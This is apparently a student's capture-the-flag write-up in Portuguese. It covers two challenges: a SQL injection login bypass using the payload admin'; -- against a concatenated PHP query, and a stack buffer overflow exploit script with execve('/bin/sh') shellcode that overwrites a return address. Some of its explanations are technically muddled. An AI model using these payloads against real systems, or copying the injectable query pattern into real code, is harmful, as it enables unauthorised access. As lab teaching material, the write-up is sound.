# CTF - WEEK 8[](url)

## Challenge #1

**1.** Ao analisar o ficheiro _index.php_, podémos verificar que este continha uma linha onde é possível ocorrer um vulnerabilidade. 

![Terminal print - index.php file](CTFs/Img/Semana8-Desafio1/1.index_php.png)

- Podemos verificar que podemos inserir, na linha em baixo no campo $username, uma subquery que nos permita fazer login com a conta do administrador.

```php
$username = $_POST['username'];
$password = $_POST['password'];
               
$query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";
```

**2.** Sendo assim, no campo _username_ no servidor poderemos colocar a seguinte _string_:

```sql
admin'; --
```
![Terminal print - login page](CTFs/Img/Semana8-Desafio1/2.login.png)


**3.** Ao instroduzir a _stirng_ referida em cima, podemos verificar que a query do ficheiro vai ficar:

```sql
SELECT username FROM user WHERE username = 'admin'; -- ".$username."' AND password = '".$password."'";
```

- Assim, conseguimos fazer "login" na conta do administrador e obter a flag.

![Terminal print - flag result](CTFs/Img/Semana8-Desafio1/3.result.png)

## Challenge #2

- Tendo uma stack com permissão de execução e um buffer overflow. O que será que se pode fazer?

**1.** Ao executar o ficheiro "program" (usando o _checksec_), podemos verificar que este imprime na shell o endereço da variável buffer. Iremos usar este valor mais tarde.

![Terminal print - execution of program file](CTFs/Img/Semana8-Desafio2/1.execute_program.png)

![Terminal print - buffer address](CTFs/Img/Semana8-Desafio2/2.gdb_buffer_address.png)

**2.** Ao usar o ficheiro _exploit-example.py_ de outros CTFs, podemos adaptar o mesmo para que funcione no CTF desta semana. <br>Explicação do código (do ficheiro "exploit-example.py"):

**2.1.** Começamos por retirar o valor do endereço do buffer que foi impresso no passo 1) (usamos Regex para obter o endereço de memória).

```py
txt = p.recvuntil(b":").decode()
addr = re.search('0x(.+?).\n', txt).group(1)
```

**2.2.** Transformar o código hexadecimal (corresponde à shell) num array de bytes.

```py
buf = bytearray.fromhex(addr)
buf.reverse()
```

**2.3.** Criar o frame pointer (váriavel "fp"). Sabemos que o frame pointer encontra-se na stack logo a seguir às variáveis locais. Este também tem um tamanho de 32 bits (ou 8 bytes) (o tamanho do frame pointer depende da arquitetura da máquina). Sendo assim, criamos um número hexadecimal constituído por oito 0's em hexadecimal.

![drawing - stack memory](CTFs/Img/Semana8-Desafio2/4.stack.png)

```py
shellcode = bytearray.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80")
fp = bytearray.fromhex("0"*8)
```

**2.4.** Criar a "string" final que será enviada para o exploit.

```py
finalString = b"a"*77 + fp*2 + buf
```

**2.5.** Mandar esta string para a shellcode. Para conseguirmos fazer isso teremos de colocar a string a seguir ao código hexadecimal referente à shell.

```py
p.sendline(shellcode + finalString)
```

### Conclusão

Tentamos fazer overwrite do endereço de retorno da função colocando o código referente à shellcode (shellcode). Quando este retornar este enderenço na função, vai executar o código que estiver nesse endereço, ou seja, vai executar as instruções na shellcode (mas em código).
